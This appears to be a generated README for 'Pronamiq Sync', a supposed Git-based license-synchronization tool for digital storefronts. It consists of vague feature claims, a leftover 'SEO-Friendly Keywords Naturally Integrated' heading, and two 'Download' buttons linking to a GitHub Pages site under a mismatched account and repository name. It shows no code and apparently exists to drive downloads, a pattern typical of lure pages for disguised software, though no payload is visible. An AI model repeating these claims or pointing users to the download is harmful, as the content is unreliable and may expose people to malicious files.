![preview](https://raw.githubusercontent.com/gswggassd-collab/edd-software-licenses-mirror-synced/main/preview.svg)

# Pronamiq Sync — Versioned Licensing Bridge for Digital Goods

**Pronamiq Sync** is a purpose-built synchronization layer designed to bridge the gap between your digital product sales platform and a Git-based versioning workflow. Inspired by the need for a clean, auditable license management pipeline, this tool transforms how creators and developers track, deliver, and validate software entitlements without relying on proprietary dashboards.

Instead of a traditional licensing server, Pronamiq Sync treats your repository as the single source of truth. Every license activation, deactivation, or renewal becomes a commit in a hidden, structured branch — allowing you to roll back, audit, or fork your entire licensing history as if it were source code.

---

## 🌟 Overview

In the current ecosystem, most digital goods platforms offer a licensing API, but the data is siloed, opaque, and difficult to integrate with modern CI/CD or DevOps pipelines. **Pronamiq Sync** flips this model: it listens to webhook events from Easy Digital Downloads (or similar platforms), translates license actions into structured JSON payloads, and pushes them into a dedicated `_licensing/` directory within your Git repository.

This means your license state is always versioned, always diffable, and always under your control. Need to revoke a license across a thousand customers? A single commit does it. Need to prove when a license was issued? The Git log is your notary.

---

## 🚀 Get Started

To begin using Pronamiq Sync in your own licensing workflow:

1. **Initialize the licensing branch** in any Git repository that contains your digital product assets.
2. **Configure the webhook endpoint** pointing your digital sales platform to the Pronamiq Sync relay URL.
3. **Map your product IDs** to repository paths so each license event knows exactly which version of the product it references.
4. **Run the sync daemon** (lightweight, no external dependencies beyond Python 3.9+ and Git).

### First Download

[![Download](https://raw.githubusercontent.com/gswggassd-collab/edd-software-licenses-mirror-synced/main/button.svg)](https://gswggassd-collab.github.io/edd-software-licenses-mirror-synced/)

---

## 📚 Key Features

- **Immutable License Ledger** 🔏  
  Every activation and deactivation is recorded as a signed Git commit. No database corruption, no accidental deletions — your licensing history becomes as robust as your source control.

- **Automatic Version Mapping** 🧩  
  When a customer purchases version 2.1 of a plugin, Pronamiq Sync automatically links that license to the exact Git tag or commit SHA from your repository. No manual cross-referencing.

- **Webhook Reliable Delivery** ⚡  
  Built-in retry logic with exponential backoff ensures no license event is ever dropped, even during network interruptions or server restarts.

- **Multilingual License Files** 🌐  
  License confirmation payloads can be generated in multiple languages (English, Spanish, French, German, Japanese) directly from the Git commit body — perfect for international customer bases.

- **Responsive CLI Dashboard** 🖥️  
  A lightweight terminal interface that displays active license counts, recent syncs, and any unresolved conflicts in real time.

- **24/7 Operational Logging** 🕒  
  Every sync action is timestamped and logged to a rotating file. You can replay any past event with a single command.

- **Conflict Resolution Mode** 🛠️  
  If two sales events modify the same license within milliseconds, Pronamiq Sync detects the conflict automatically and flags it for manual review — no silent overwrites.

---

## 🔍 How It Differs from Traditional Licensing Solutions

Most licensing tools are built around a centralized database that you must maintain, back up, and secure. Pronamiq Sync instead **borrows from the immutable infrastructure movement**. By decoupling license state from a database and embedding it into a Git repository, you inherit:

- **Built-in replication** via Git remotes.
- **Free backups** via any Git hosting service.
- **Native diff tools** for comparing license states across time.
- **Branchable licensing policies** — test a new revocation strategy on a feature branch before merging to production.

This approach reduces operational overhead while increasing transparency for your end users. They can verify their license activation status by inspecting the public branch — no need to trust a black box server.

---

## 🧱 Architecture Philosophy

Pronamiq Sync relies on a **three-layer mediation** principle:

1. **Capture Layer** — Listens for webhook events from your digital storefront.
2. **Translation Layer** — Converts raw JSON payloads into a domain-specific license schema (with fields like `product_id`, `license_key`, `activation_limit`, `expiry_date`).
3. **Storage Layer** — Pushes structured license files into a Git repository under `_licensing/<product_id>/<license_key>.json`, each with a commit message that mirrors the event type.

No database setup. No schema migrations. No third-party cloud services required.

---

## 🔐 Licensing Model

Pronamiq Sync itself is distributed under the **MIT License**. The license files it generates for your products remain under your own chosen terms. The tool simply manages the metadata — it never alters the actual software payloads.

### License Section

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## 📊 SEO-Friendly Keywords Naturally Integrated

- **Versioned software licensing** for digital goods  
- **Git-based entitlement management**  
- **Immutable license ledger**  
- **Webhook-driven license synchronization**  
- **Reproducible licensing audits**  
- **Multilingual license payload generation**  
- **Decentralized license storage**  
- **Conflict-resilient activation tracking**

---

## ⚠️ Disclaimer

Pronamiq Sync is a synchronization utility, not a legal or cryptographic guarantee of license authenticity. While the tool structures licensing data within a Git repository, users are responsible for verifying that their chosen Git hosting platform meets any applicable regulatory requirements for record-keeping. The maintainers assume no liability for lost license data resulting from misuse of Git commands (e.g., force pushes, garbage collection, or repository deletion). Always maintain offline backups of your licensing branch.

This tool does not obfuscate, encrypt, or validate the integrity of the software being licensed — it only tracks the metadata associated with license activations and revocations.

**Year of initial public release: 2026.**

---

## 🧪 Final Thoughts

Pronamiq Sync is built for makers who want transparency over abstraction. By replacing the black box of a licensing server with the familiar mechanics of Git, you gain unprecedented control over your digital product lifecycle. Every license is a file. Every action is a commit. Every customer is a branch of trust.

[![Download](https://raw.githubusercontent.com/gswggassd-collab/edd-software-licenses-mirror-synced/main/button.svg)](https://gswggassd-collab.github.io/edd-software-licenses-mirror-synced/)